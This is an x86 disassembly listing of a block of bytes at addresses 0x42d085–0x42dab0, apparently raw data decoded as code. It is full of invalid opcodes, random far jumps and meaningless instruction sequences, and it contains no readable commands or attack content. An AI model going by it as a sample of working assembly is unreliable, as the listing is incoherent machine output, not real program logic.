  42d085:	dec    esp
  42d086:	and    al,0x6c
  42d088:	adc    eax,DWORD PTR [ebx+0x76]
  42d08b:	xchg   edx,eax
  42d08c:	add    DWORD PTR [ebx-0x44],edx
  42d08f:	jae    0x42d091
	...
  42d0f1:	add    BYTE PTR [eax],al
  42d0f3:	add    BYTE PTR [eax+0x3a],dl
  42d0f6:	(bad)  
  42d0f7:	sub    al,0xee
  42d0f9:	cld    
  42d0fa:	cli    
  42d0fb:	jle    0x42d090
  42d0fd:	dec    esp
  42d0fe:	nop
  42d0ff:	xor    BYTE PTR [esi],bh
  42d101:	cmp    eax,0xe20cea24
  42d106:	add    DWORD PTR [eax],eax
  42d108:	add    al,0x1
  42d10a:	add    BYTE PTR [eax],al
  42d10c:	call   0x4c96:0xc6775fe8
  42d113:	js     0x42d148
  42d115:	mov    esi,0x327a2efb
  42d11a:	xchg   esp,eax
  42d11b:	pop    esp
  42d11c:	cmp    eax,0x442a1217
  42d121:	jmp    0x42d0cd
  42d123:	push   ss
  42d124:	or     bl,dl
  42d126:	or     BYTE PTR [eax-0x2a],dh
  42d129:	pop    edi
  42d12a:	jbe    0x42d19e
  42d12c:	pop    esp
  42d12d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d12e:	and    DWORD PTR [edi-0x74d61712],ebp
  42d134:	add    eax,0x2b844749
  42d139:	cmp    al,BYTE PTR [esi-0x80]
  42d13c:	push   ebp
  42d13d:	gs dec ebp
  42d13f:	sbb    al,0xaf
  42d141:	test   dl,ch
  42d143:	sbb    al,0xfa
  42d145:	sar    DWORD PTR [edi+0x25e0ad05],0xe6
  42d14c:	adc    DWORD PTR [ecx+0x54],ebp
  42d14f:	in     eax,0x45
  42d151:	sbb    DWORD PTR [ebx-0x143500c5],eax
  42d157:	or     bh,BYTE PTR [eax-0x2a065214]
  42d15d:	inc    bx
  42d15f:	pop    esi
  42d160:	pop    es
  42d161:	mov    esi,0x4fcc4412
  42d166:	cs cli 
  42d168:	add    ch,cl
  42d16a:	sti    
  42d16b:	and    edx,DWORD PTR [esi+0x15a85eab]
  42d171:	std    
  42d172:	jno    0x42d1e6
  42d174:	sbb    BYTE PTR [ecx],0xab
  42d177:	sbb    ebx,DWORD PTR [ebx-0x1c97ba71]
  42d17d:	pop    esp
  42d17e:	xor    DWORD PTR [edx+0x6c870e31],ebx
  42d184:	jmp    0xa667:0xa9d756f6
  42d18b:	push   esi
  42d18c:	sbb    BYTE PTR [eax+0x3479a67c],bl
  42d192:	aam    0xd0
  42d194:	cmc    
  42d195:	and    ecx,0xaf689137
  42d19b:	dec    edx
  42d19c:	lods   eax,DWORD PTR ss:[esi]
  42d19e:	jmp    DWORD PTR [esi]
  42d1a0:	imul   ebx,DWORD PTR [ebx+0x9],0xa5303f69
  42d1a7:	rcl    DWORD PTR [ebx],cl
  42d1a9:	sti    
  42d1aa:	jg     0x42d1a3
  42d1ac:	push   ecx
  42d1ad:	sub    edx,DWORD PTR [edi+eax*1-0x11]
  42d1b1:	adc    eax,0x9ed97cc8
  42d1b6:	mov    cl,0x6e
  42d1b8:	cli    
  42d1b9:	test   BYTE PTR [ebx+ebx*8-0x69],0xa8
  42d1be:	push   es
  42d1bf:	push   ds
  42d1c0:	xlat   BYTE PTR ds:[ebx]
  42d1c1:	sub    BYTE PTR [si+0x543d],bl
  42d1c6:	xlat   BYTE PTR ds:[ebx]
  42d1c7:	cmp    DWORD PTR [edx+0x35],ecx
  42d1ca:	sbb    edx,DWORD PTR [ebp-0x39fdcb5e]
  42d1d0:	scas   al,BYTE PTR es:[edi]
  42d1d1:	shl    BYTE PTR [ebp-0x99b89a4],cl
  42d1d7:	cmp    dl,BYTE PTR [edx-0x4b2bc01e]
  42d1dd:	and    BYTE PTR [edi],dl
  42d1df:	imul   DWORD PTR [eax+0x25]
  42d1e2:	fstp   QWORD PTR [ebx-0x2ca8868d]
  42d1e8:	sub    BYTE PTR [ebx],dh
  42d1ea:	push   ebx
  42d1eb:	sub    eax,0xae545b35
  42d1f0:	pop    esi
  42d1f1:	inc    edi
  42d1f2:	inc    ebp
  42d1f3:	inc    ebx
  42d1f4:	(bad)  
  42d1f5:	(bad)  
  42d1f6:	jecxz  0x42d1c7
  42d1f8:	and    DWORD PTR [ecx-0x7],edi
  42d1fb:	retf   
  42d1fc:	out    dx,eax
  42d1fd:	mov    dh,BYTE PTR [ebp+edx*1+0x2a]
  42d201:	and    bl,BYTE PTR [ebx+0x68124b71]
  42d207:	push   es
  42d208:	sar    DWORD PTR [edi],0xa
  42d20b:	leave  
  42d20c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d20d:	push   ebp
  42d20e:	scas   eax,DWORD PTR es:[edi]
  42d20f:	dec    ebp
	...
  42d274:	lea    ecx,[eax]
  42d276:	pop    ebp
  42d277:	jbe    0x42d256
  42d279:	ja     0x42d22a
  42d27b:	sti    
  42d27c:	aaa    
  42d27d:	out    0x36,eax
  42d27f:	ja     0x42d25c
  42d281:	sbb    BYTE PTR ss:[edx+0x1e310],bh
  42d288:	add    al,0x1
  42d28a:	add    BYTE PTR [eax],al
  42d28c:	inc    edi
  42d28d:	lods   al,BYTE PTR ds:[esi]
  42d28e:	or     al,0x23
  42d290:	pop    esp
  42d291:	xor    BYTE PTR [eax],bl
  42d293:	sub    dl,BYTE PTR ds:0x1dad486a
  42d299:	popf   
  42d29a:	mov    esp,0x13aee3b2
  42d29f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d2a0:	xlat   BYTE PTR ds:[ebx]
  42d2a1:	pusha  
  42d2a2:	xchg   ebp,eax
  42d2a3:	retf   
  42d2a4:	lea    esp,[edi+edi*8+0x1f625b9]
  42d2ab:	mov    cs,WORD PTR [ecx-0x6]
  42d2ae:	ins    DWORD PTR es:[edi],dx
  42d2af:	mov    ebp,0x25607669
  42d2b4:	popa   
  42d2b5:	push   eax
  42d2b6:	out    dx,al
  42d2b7:	mov    eax,ds:0xa19d9f09
  42d2bc:	pop    esi
  42d2bd:	lahf   
  42d2be:	icebp  
  42d2bf:	aad    0x9b
  42d2c1:	imul   ecx,DWORD PTR [ebx],0x502634d4
  42d2c7:	push   ebp
  42d2c8:	out    dx,eax
  42d2c9:	dec    ecx
  42d2ca:	cmp    bl,BYTE PTR ds:0xde2ff08a
  42d2d0:	enter  0x6e6,0x45
  42d2d4:	pushf  
  42d2d5:	or     BYTE PTR [eax+edx*4-0x5f],bh
  42d2d9:	xor    al,0xea
  42d2db:	adc    edi,ebp
  42d2dd:	shr    BYTE PTR [esi+ecx*4-0x343c1ad5],cl
  42d2e4:	mov    al,ds:0x38da733e
  42d2e9:	popf   
  42d2ea:	mov    ah,0x3e
  42d2ec:	std    
  42d2ed:	adc    al,0x71
  42d2ef:	jbe    0x42d36c
  42d2f1:	sub    BYTE PTR [eax+0x56],0x93
  42d2f5:	add    eax,0xd2f4f518
  42d2fa:	sub    BYTE PTR [edi-0x24],ah
  42d2fd:	scas   al,BYTE PTR es:[edi]
  42d2fe:	mov    ds:0xb0bb1762,al
  42d303:	loope  0x42d2b3
  42d305:	nop
  42d306:	ins    DWORD PTR es:[edi],dx
  42d307:	sahf   
  42d308:	popa   
  42d309:	jo     0x42d371
  42d30b:	jmp    0x1f896603
  42d310:	call   0xba05c1c0
  42d315:	outs   dx,DWORD PTR ds:[esi]
  42d316:	sbb    DWORD PTR [edx-0x4c4610a9],edx
  42d31c:	push   ds
  42d31d:	jbe    0x42d323
  42d31f:	mov    ch,0xda
  42d321:	iret   
  42d322:	out    0x6b,al
  42d324:	mov    bh,0x14
  42d326:	mov    ah,BYTE PTR [edx+0x4c726d48]
  42d32c:	outs   dx,DWORD PTR ds:[esi]
  42d32d:	inc    edi
  42d32e:	dec    edx
  42d32f:	xchg   esi,eax
  42d330:	aas    
  42d331:	loope  0x42d30d
  42d333:	pop    edi
  42d334:	mov    al,0x53
  42d336:	or     DWORD PTR [esi-0x13],0x9d86d8bf
  42d33d:	mov    esi,0xd8fcb051
  42d342:	and    BYTE PTR [ecx+0x743e1e58],bl
  42d348:	xchg   esp,eax
  42d349:	xor    bl,BYTE PTR [esi+ebp*2-0xfa9f34d]
  42d350:	je     0x42d2e1
  42d352:	(bad)  
  42d353:	in     eax,dx
  42d354:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d355:	mov    esi,0x87426a35
  42d35a:	rol    BYTE PTR [eax+0x35],0xb3
  42d35e:	call   0xa8e3a85f
  42d363:	call   0x4fae:0x692bf080
  42d36a:	lds    edi,FWORD PTR [ebx+0x4087098f]
  42d370:	ss and bh,dh
  42d373:	(bad)  
  42d374:	mov    bh,0x62
  42d376:	cli    
  42d377:	test   al,0xaf
  42d379:	fisubr DWORD PTR [ecx-0x21]
  42d37c:	jmp    0xf82eb08a
  42d381:	mov    eax,ds:0xb420e889
  42d386:	test   esp,edi
  42d388:	adc    BYTE PTR [eax+edx*4],dh
  42d38b:	cmp    esi,DWORD PTR [ecx]
  42d38d:	push   ss
  42d38e:	push   0xf
	...
  42d3f4:	ror    esi,0x63
  42d3f7:	cdq    
  42d3f8:	outs   dx,DWORD PTR ds:[esi]
  42d3f9:	mov    ebp,0x9459defb
  42d3fe:	aaa    
  42d3ff:	pushf  
  42d400:	add    eax,0x142f1fb9
  42d405:	in     al,0x1
  42d407:	add    BYTE PTR [ecx+eax*1],al
  42d40a:	add    BYTE PTR [eax],al
  42d40c:	mov    ecx,0x292eee93
  42d411:	pop    ebp
  42d412:	mov    dl,BYTE PTR [edx+0x17]
  42d415:	(bad)  
  42d416:	adc    BYTE PTR [eax+0x2f22b8fd],cl
  42d41c:	out    0x85,al
  42d41e:	add    al,0x49
  42d420:	mov    ebx,0x5065d0ed
  42d425:	imul   esp,DWORD PTR [ebx+0x61],0x61
  42d429:	ins    BYTE PTR es:[edi],dx
  42d42a:	in     eax,0x29
  42d42c:	ja     0x42d45f
  42d42e:	jno    0x42d490
  42d430:	jmp    0x9e285aa3
  42d435:	leave  
  42d436:	mov    cl,0xfa
  42d438:	or     cl,0xd
  42d43b:	loop   0x42d45b
  42d43d:	loop   0x42d44b
  42d43f:	(bad)  
  42d440:	fild   QWORD PTR [esi-0x4ce96e37]
  42d446:	not    DWORD PTR [esi-0x5]
  42d449:	jne    0x42d41b
  42d44b:	lahf   
  42d44c:	jp     0x42d45f
  42d44e:	gs neg cl
  42d451:	fld    TBYTE PTR [edx+eax*8-0xc]
  42d455:	leave  
  42d456:	pop    esp
  42d457:	call   0xcec:0x7a501bf5
  42d45e:	pop    ds
  42d45f:	adc    bl,bl
  42d461:	out    0x16,eax
  42d463:	xlat   BYTE PTR ds:[ebx]
  42d464:	(bad)  
  42d465:	cmp    bh,BYTE PTR [ebx]
  42d467:	inc    esp
  42d468:	outs   dx,DWORD PTR ds:[esi]
  42d469:	adc    eax,0x5b5f38fe
  42d46e:	aad    0xae
  42d470:	push   ebp
  42d471:	fs pop ecx
  42d473:	sbb    eax,0xdeb05aa4
  42d478:	dec    ebp
  42d479:	lods   eax,DWORD PTR ds:[esi]
  42d47a:	pop    ebp
  42d47b:	pop    edi
  42d47c:	(bad)  
  42d47d:	pop    ss
  42d47e:	(bad)  
  42d47f:	pop    ebp
  42d480:	popf   
  42d481:	sbb    bh,BYTE PTR [ebx+ebp*2-0x69da756c]
  42d488:	pop    ds
  42d489:	dec    ebx
  42d48a:	sbb    al,0xb9
  42d48c:	inc    edi
  42d48d:	rcr    BYTE PTR [eax+0x1ab3f382],0xf
  42d494:	jns    0x42d4fc
  42d496:	addr16 xchg esp,eax
  42d498:	jae    0x42d475
  42d49a:	nop
  42d49b:	(bad)  
  42d49c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d49d:	(bad)  
  42d49e:	xchg   BYTE PTR gs:[eax+0x38fe5cef],bl
  42d4a5:	jmp    0x61554f04
  42d4aa:	in     eax,dx
  42d4ab:	bnd jge 0x42d460
  42d4ae:	rcl    DWORD PTR [ebx],0x67
  42d4b1:	and    DWORD PTR ds:0xcf8437ea,edi
  42d4b7:	hlt    
  42d4b8:	pop    ds
  42d4b9:	fcom   DWORD PTR [ebx-0x7]
  42d4bc:	xor    dl,BYTE PTR [edi+ebx*4]
  42d4bf:	mov    eax,ds:0x32d906ca
  42d4c4:	arpl   WORD PTR [ecx-0x159a78bf],ax
  42d4ca:	mov    ch,bl
  42d4cc:	cwde   
  42d4cd:	inc    edx
  42d4ce:	(bad)  
  42d4cf:	jns    0x42d4fb
  42d4d1:	sbb    eax,0x459d2530
  42d4d6:	cld    
  42d4d7:	or     ch,dl
  42d4d9:	and    edx,DWORD PTR [esi]
  42d4db:	in     eax,dx
  42d4dc:	xchg   edx,eax
  42d4dd:	cmp    al,0x7f
  42d4df:	add    ecx,DWORD PTR ds:0x68772bb1
  42d4e5:	repz mov eax,0x33bf4438
  42d4eb:	fdivr  st(4),st
  42d4ed:	and    eax,0xf08c382
  42d4f2:	add    DWORD PTR [eax],esi
  42d4f4:	ret    
  42d4f5:	rcl    BYTE PTR [edi-0x50],0x4d
  42d4f9:	dec    edx
  42d4fa:	push   0xc6c54f31
  42d4ff:	les    ecx,FWORD PTR [ebx]
  42d501:	xlat   BYTE PTR ds:[ebx]
  42d502:	xlat   BYTE PTR ds:[ebx]
  42d503:	popa   
  42d504:	(bad)  
  42d505:	jmp    0xb95e3da1
  42d50a:	inc    ebx
  42d50b:	sub    DWORD PTR [ebp-0x59],ebx
  42d50e:	xor    eax,0x8a
	...
  42d573:	add    BYTE PTR [ecx-0x11ac7d0b],bl
  42d579:	ja     0x42d554
  42d57b:	call   FWORD PTR [ebp+0x3e]
  42d57e:	mov    ds:0xf7c1d7d5,eax
  42d583:	sbb    ebx,DWORD PTR [eax]
  42d585:	in     eax,0x1
  42d587:	add    BYTE PTR [ecx+eax*1],al
  42d58a:	add    BYTE PTR [eax],al
  42d58c:	adc    bh,dh
  42d58e:	dec    esi
  42d58f:	out    0xa9,al
  42d591:	or     WORD PTR [ecx-0x507c4f14],di
  42d598:	mov    ds:0xdd5e7adb,eax
  42d59d:	dec    edx
  42d59e:	sub    edi,DWORD PTR [ecx]
  42d5a0:	aaa    
  42d5a1:	nop
  42d5a2:	das    
  42d5a3:	das    
  42d5a4:	imul   ecx,edx,0xffffffd9
  42d5a7:	jbe    0x42d584
  42d5a9:	adc    eax,DWORD PTR [edi+0x5fd3fcfa]
  42d5af:	xor    eax,0x3b99d805
  42d5b4:	fnstenv [eax-0x43]
  42d5b7:	ret    0x13cf
  42d5ba:	dec    ebp
  42d5bb:	arpl   di,cx
  42d5bd:	dec    edx
  42d5be:	outs   dx,BYTE PTR ds:[esi]
  42d5bf:	add    DWORD PTR [eax],edx
  42d5c1:	sub    eax,0x8a74cca0
  42d5c6:	popf   
  42d5c7:	jle    0x42d631
  42d5c9:	sbb    BYTE PTR [edx-0x10934a2c],dh
  42d5cf:	in     al,0xa5
  42d5d1:	push   esp
  42d5d2:	inc    ebp
  42d5d3:	push   ecx
  42d5d4:	(bad)  
  42d5d5:	out    dx,eax
  42d5d6:	movlhps xmm7,xmm1
  42d5d9:	js     0x42d5e2
  42d5db:	lods   al,BYTE PTR ds:[esi]
  42d5dc:	dec    eax
  42d5dd:	sub    DWORD PTR [eax],edx
  42d5df:	nop
  42d5e0:	mov    edx,0x46c4fb7b
  42d5e5:	call   0x283e6de9
  42d5ea:	push   0x37a0d54c
  42d5ef:	retf   
  42d5f0:	inc    edx
  42d5f1:	jns    0x42d604
  42d5f3:	pushf  
  42d5f4:	fsub   DWORD PTR [edx-0x19ae1fee]
  42d5fa:	es pop es
  42d5fc:	xchg   DWORD PTR [ebx],edi
  42d5fe:	cwde   
  42d5ff:	xor    eax,DWORD PTR [ecx-0x2cd7c92f]
  42d605:	call   0xcb3fb3cd
  42d60a:	push   es
  42d60b:	sub    DWORD PTR [edx+0x32b027f2],edx
  42d611:	jg     0x42d612
  42d613:	xlat   BYTE PTR ds:[ebx]
  42d614:	dec    eax
  42d615:	test   ecx,ebx
  42d617:	inc    edi
  42d618:	sub    BYTE PTR [ebx],ch
  42d61a:	or     ah,BYTE PTR [ebx+ecx*2-0x62f7a4ca]
  42d621:	mov    esi,0xcaa73ea3
  42d626:	in     eax,dx
  42d627:	arpl   WORD PTR [ebx+0x52],di
  42d62a:	repnz cmp eax,0xeb1e50a3
  42d630:	fidivr WORD PTR [esi-0x5a]
  42d633:	pop    ss
  42d634:	mov    ds:0x5b3eba8e,eax
  42d639:	and    al,0xd1
  42d63b:	mov    ecx,0x2071def9
  42d640:	es add edx,esi
  42d643:	test   DWORD PTR [edx+0x6bcde88f],edx
  42d649:	call   0x91fe9ecc
  42d64e:	or     BYTE PTR [edi+0x5b0e3ed],dl
  42d654:	cmp    eax,esp
  42d656:	add    al,0xfb
  42d658:	retf   0x5dec
  42d65b:	pusha  
  42d65c:	inc    esp
  42d65d:	scas   al,BYTE PTR es:[edi]
  42d65e:	repz jmp 0x284e:0x146a0f05
  42d666:	call   0xf3ed:0xcaa649a7
  42d66d:	push   ebp
  42d66e:	push   ecx
  42d66f:	mov    cl,0x44
  42d671:	inc    ebx
  42d672:	push   ecx
  42d673:	scas   eax,DWORD PTR es:[edi]
  42d674:	jns    0x42d66c
  42d676:	or     DWORD PTR [esi-0x10b901ba],ecx
  42d67c:	lods   eax,DWORD PTR ds:[esi]
  42d67d:	popa   
  42d67e:	popa   
  42d67f:	pop    ebx
  42d680:	or     al,0xdb
  42d682:	sbb    DWORD PTR [esi+ebx*1+0x18ddce53],0x4b
  42d68a:	and    dl,al
  42d68c:	out    dx,al
  42d68d:	cmc    
  42d68e:	mov    ah,0x1b
	...
  42d6f4:	repz add esp,DWORD PTR [eax]
  42d6f7:	(bad)  
  42d6f8:	lock scas eax,DWORD PTR es:[edi]
  42d6fa:	(bad)  
  42d6fb:	jg     0x42d67e
  42d6fd:	in     al,0x2c
  42d6ff:	and    al,0x23
  42d701:	stos   BYTE PTR es:[edi],al
  42d702:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d703:	in     eax,dx
  42d704:	sbb    al,0xe6
  42d706:	add    DWORD PTR [eax],eax
  42d708:	add    al,0x1
  42d70a:	add    BYTE PTR [eax],al
  42d70c:	outs   dx,BYTE PTR ds:[esi]
  42d70d:	popa   
  42d70e:	mov    cl,0x9a
  42d710:	inc    ecx
  42d711:	bswap  ebx
  42d713:	mov    bh,0x9b
  42d715:	jge    0x42d6e0
  42d717:	mov    BYTE PTR [edi],al
  42d719:	adc    DWORD PTR [ebx-0x1a679293],ebp
  42d71f:	ins    DWORD PTR es:[edi],dx
  42d720:	jbe    0x42d6d4
  42d722:	pop    eax
  42d723:	xchg   ecx,eax
  42d724:	mov    ds:0x72e593b,eax
  42d729:	and    eax,0xfa582377
  42d72e:	inc    eax
  42d72f:	add    esp,DWORD PTR [edi-0x44e61ce]
  42d735:	pop    ss
  42d736:	imul   ebx,DWORD PTR [edi+ebp*8-0x77713e06],0x36
  42d73e:	xor    DWORD PTR [ebx+ebx*4-0x20],0xf28576b8
  42d746:	cld    
  42d747:	add    esp,DWORD PTR [edx-0xaf29261]
  42d74d:	leave  
  42d74e:	and    al,dl
  42d750:	add    DWORD PTR [ebx+0x66],0x5ba17086
  42d757:	xor    BYTE PTR [ebx-0xdd6ff61],al
  42d75d:	push   ss
  42d75e:	(bad)  
  42d75f:	mov    edi,0x20c1056b
  42d764:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d765:	out    dx,eax
  42d766:	mov    ds:0x96e00340,al
  42d76b:	sbb    DWORD PTR [ebx-0x11],edx
  42d76e:	loop   0x42d707
  42d770:	shr    esp,0x5d
  42d773:	push   ss
  42d774:	mov    edi,0x1221b4b9
  42d779:	xor    eax,0x366aa92f
  42d77e:	xchg   esi,eax
  42d77f:	adc    DWORD PTR [eax],edi
  42d781:	xadd   DWORD PTR [esi],edx
  42d784:	retf   
  42d785:	add    ch,ch
  42d787:	aas    
  42d788:	popf   
  42d789:	sbb    BYTE PTR [ebx],ah
  42d78b:	add    edx,ecx
  42d78d:	aad    0xe7
  42d78f:	adc    eax,0x9b7b6583
  42d794:	mov    ds:0xbf430f92,al
  42d799:	mov    edx,0xa79cec3d
  42d79e:	pop    esp
  42d79f:	mov    ch,0x14
  42d7a1:	jne    0x42d7a0
  42d7a3:	push   cs
  42d7a4:	shl    BYTE PTR ds:0x3b04782,1
  42d7aa:	dec    ebp
  42d7ab:	lods   al,BYTE PTR ds:[esi]
  42d7ac:	and    ebp,DWORD PTR [ebp+0x168bde9d]
  42d7b2:	icebp  
  42d7b3:	inc    eax
  42d7b4:	jl     0x42d834
  42d7b6:	push   ecx
  42d7b7:	idiv   BYTE PTR [eax-0x2ecc68b2]
  42d7bd:	imul   ebx,DWORD PTR [ebx],0x49
  42d7c0:	stc    
  42d7c1:	div    eax
  42d7c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d7c4:	mov    esp,0x3c6a9892
  42d7c9:	pop    esp
  42d7ca:	xor    al,0xb3
  42d7cc:	out    dx,al
  42d7cd:	add    eax,0x726623f0
  42d7d2:	pushf  
  42d7d3:	and    dl,BYTE PTR [ebx+edi*4+0x1239d35e]
  42d7da:	call   0x6b8f8d81
  42d7df:	dec    edx
  42d7e0:	mov    bh,0x78
  42d7e2:	retf   
  42d7e3:	xchg   ebx,esi
  42d7e5:	add    ah,bh
  42d7e7:	out    dx,eax
  42d7e8:	mov    ebx,0x5c5b33cb
  42d7ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d7ee:	ins    DWORD PTR es:[edi],dx
  42d7ef:	inc    ebp
  42d7f0:	cld    
  42d7f1:	jb     0x42d86a
  42d7f3:	push   edx
  42d7f4:	loopne 0x42d857
  42d7f6:	xor    DWORD PTR [eax-0x22],ebp
  42d7f9:	ficomp WORD PTR [ebp-0x5e]
  42d7fc:	push   ds
  42d7fd:	jno    0x42d7a5
  42d7ff:	mov    BYTE PTR [esi-0x19],0xbb
  42d803:	std    
  42d804:	fwait
  42d805:	adc    al,0xbb
  42d807:	jo     0x42d877
  42d809:	cmp    ah,BYTE PTR [ebp-0xd]
  42d80c:	daa    
  42d80d:	cmc    
  42d80e:	das    
  42d80f:	into   
	...
  42d874:	xchg   esi,eax
  42d875:	fwait
  42d876:	cwde   
  42d877:	pop    edi
  42d878:	popf   
  42d879:	pop    edi
  42d87a:	xlat   BYTE PTR ds:[ebx]
  42d87b:	fistp  DWORD PTR ds:0x79c6961a
  42d881:	mov    ah,0x24
  42d883:	ins    DWORD PTR es:[edi],dx
  42d884:	and    bh,ah
  42d886:	add    DWORD PTR [eax],eax
  42d888:	add    al,0x1
  42d88a:	add    BYTE PTR [eax],al
  42d88c:	jmp    0x1851c502
  42d891:	in     eax,dx
  42d892:	pushf  
  42d893:	jecxz  0x42d83f
  42d895:	jae    0x42d90e
  42d897:	xlat   BYTE PTR ds:[bx]
  42d899:	push   edx
  42d89a:	repnz mov bh,0x55
  42d89d:	xchg   esp,esi
  42d89f:	jmp    0xb689:0xe89c22a7
  42d8a6:	mov    bh,0x72
  42d8a8:	es pushf 
  42d8aa:	sbb    ah,ch
  42d8ac:	and    DWORD PTR [ebx-0x50],esp
  42d8af:	mov    ds:0x18ef12b,al
  42d8b4:	adc    ch,BYTE PTR [ebx+eiz*8]
  42d8b7:	mov    esp,0x462bc107
  42d8bc:	pop    es
  42d8bd:	sbb    ah,cl
  42d8bf:	and    esi,DWORD PTR [esp+eiz*8]
  42d8c2:	loope  0x42d8e5
  42d8c4:	push   ecx
  42d8c5:	icebp  
  42d8c6:	xchg   esp,eax
  42d8c7:	in     eax,dx
  42d8c8:	lds    esi,FWORD PTR [esi]
  42d8ca:	mov    dh,0xe6
  42d8cc:	scas   eax,DWORD PTR es:[edi]
  42d8cd:	mov    bh,BYTE PTR [ebx+0x5a]
  42d8d0:	push   es
  42d8d1:	push   0x4a1b2ada
  42d8d6:	xchg   edx,eax
  42d8d7:	bound  ebp,QWORD PTR [esi]
  42d8d9:	jg     0x42d92a
  42d8db:	pop    ebp
  42d8dc:	sbb    al,0x6f
  42d8de:	sbb    ebp,DWORD PTR [ecx+ebp*4]
  42d8e1:	mov    ecx,0x77474ff9
  42d8e6:	sub    ecx,DWORD PTR [eax]
  42d8e8:	std    
  42d8e9:	jg     0x42d90b
  42d8eb:	or     bh,BYTE PTR ds:0xc10644c4
  42d8f1:	(bad)  
  42d8f3:	cmp    BYTE PTR [edi-0x117959d9],ah
  42d8f9:	bound  ecx,QWORD PTR [ecx]
  42d8fb:	mov    edi,0x1655e724
  42d900:	mov    al,0x6b
  42d902:	mov    ecx,0xea1f7be4
  42d907:	push   cs
  42d908:	les    ebp,FWORD PTR [ebp+0xa1dcd41]
  42d90e:	or     eax,0x77c211e8
  42d913:	xchg   ecx,eax
  42d914:	(bad)  [ecx-0x27485eb2]
  42d91a:	jl     0x42d8f1
  42d91c:	popf   
  42d91d:	ret    0x8488
  42d920:	or     DWORD PTR [esi+0x4c],0x1d8f2ba1
  42d927:	out    dx,eax
  42d928:	xchg   BYTE PTR [edi+0x72],ch
  42d92b:	dec    ebp
  42d92c:	adc    eax,0x7292a54
  42d931:	loop   0x42d8f4
  42d933:	test   al,0xd
  42d935:	mov    bh,BYTE PTR [ebp+0x10]
  42d938:	shr    BYTE PTR [edi],0xd1
  42d93b:	mov    ebp,0xf142fae3
  42d940:	cs (bad) 
  42d942:	sti    
  42d943:	sub    DWORD PTR [ebp+0x5171932],eax
  42d949:	sbb    DWORD PTR [ecx+ebp*1],esi
  42d94c:	loope  0x42d952
  42d94e:	ins    BYTE PTR es:[edi],dx
  42d94f:	mov    eax,ds:0xb016888d
  42d954:	or     al,0x79
  42d956:	adc    eax,0x6d21fcf4
  42d95b:	pop    eax
  42d95c:	mov    dl,0x24
  42d95e:	fcomi  st,st(4)
  42d960:	sub    edi,DWORD PTR [ebx+0x2b00b624]
  42d966:	jp     0x42d8f7
  42d968:	sti    
  42d969:	sbb    BYTE PTR [edi-0x7db7522b],bl
  42d96f:	les    esi,FWORD PTR [ecx-0x7c]
  42d972:	xlat   BYTE PTR ds:[ebx]
  42d973:	mov    cl,0xf8
  42d975:	sar    DWORD PTR [edi],0x28
  42d978:	inc    esi
  42d979:	or     al,0x9b
  42d97b:	inc    ebp
  42d97c:	jle    0x42d98f
  42d97e:	pop    edx
  42d97f:	(bad)  
  42d981:	mov    gs,WORD PTR [esi-0x40]
  42d984:	push   ss
  42d985:	in     eax,0x4e
  42d987:	inc    ebx
  42d988:	dec    edi
  42d989:	inc    edi
  42d98a:	ja     0x42da0b
  42d98c:	std    
  42d98d:	jns    0x42d933
  42d98f:	jle    0x42d991
	...
  42d9f1:	add    BYTE PTR [eax],al
  42d9f3:	add    cl,bh
  42d9f5:	mov    cl,0x70
  42d9f7:	dec    eax
  42d9f8:	js     0x42d9c3
  42d9fa:	stc    
  42d9fb:	mov    cl,0xbf
  42d9fd:	dec    edi
  42d9fe:	int    0xe1
  42da00:	jge    0x42d99c
  42da02:	sub    bl,al
  42da04:	and    al,0xe8
  42da06:	add    DWORD PTR [eax],eax
  42da08:	add    al,0x1
  42da0a:	add    BYTE PTR [eax],al
  42da0c:	cli    
  42da0d:	xor    ebp,esp
  42da0f:	push   0xeffc8325
  42da14:	mov    ch,0x5a
  42da16:	or     DWORD PTR [ebx-0x93e83ac],ebx
  42da1c:	(bad)  
  42da1e:	not    BYTE PTR [ecx-0x15007cf7]
  42da24:	ror    bl,0xcd
  42da27:	cld    
  42da28:	push   esi
  42da29:	pmulhw mm1,QWORD PTR [edx-0x37f93bf6]
  42da30:	mov    ah,0x24
  42da32:	xor    al,BYTE PTR [edi-0x5a577ad3]
  42da38:	lods   al,BYTE PTR ds:[esi]
  42da39:	int    0xac
  42da3b:	and    al,0xd2
  42da3d:	ror    dh,1
  42da3f:	cmc    
  42da40:	out    0x93,eax
  42da42:	out    dx,al
  42da43:	retf   
  42da44:	ds push 0x15041c10
  42da4a:	adc    BYTE PTR [esi+0x6e4cd6a7],cl
  42da50:	pop    ebx
  42da51:	push   ecx
  42da52:	(bad)  
  42da54:	dec    edx
  42da55:	sub    bh,BYTE PTR [edx-0x622334c9]
  42da5b:	ja     0x42da9c
  42da5d:	icebp  
  42da5e:	ret    
  42da5f:	(bad)  
  42da61:	arpl   WORD PTR [ebp+0x10],si
  42da64:	out    0xaa,al
  42da66:	mov    al,ds:0x518dc96b
  42da6b:	push   ecx
  42da6c:	push   edx
  42da6d:	xlat   BYTE PTR ds:[ebx]
  42da6e:	pop    ebp
  42da6f:	ror    BYTE PTR ds:0xc2b4dc8c,1
  42da75:	inc    eax
  42da76:	adc    eax,0x5450040a
  42da7b:	adc    al,0x83
  42da7d:	es mov dl,0xc1
  42da80:	pop    ds
  42da81:	cwde   
  42da82:	pushf  
  42da83:	pop    esi
  42da84:	inc    ebx
  42da85:	test   BYTE PTR [edx-0xf],0xa8
  42da89:	enter  0x78a5,0x83
  42da8d:	mov    dl,0xe2
  42da8f:	mov    al,ds:0x2a9433c4
  42da94:	and    BYTE PTR [edx+eiz*4-0x2dba19ed],bh
  42da9b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42da9c:	stos   DWORD PTR es:[edi],eax
  42da9d:	mov    ah,0x7b
  42da9f:	ret    0x7c3d
  42daa2:	jb     0x42da54
  42daa4:	iret   
  42daa5:	inc    ebp
  42daa6:	lods   al,BYTE PTR ds:[esi]
  42daa7:	sub    DWORD PTR [eax],eax
  42daa9:	inc    ebx
  42daaa:	sub    ah,BYTE PTR [ecx-0x4934fb1f]
  42dab0:	pop    esp
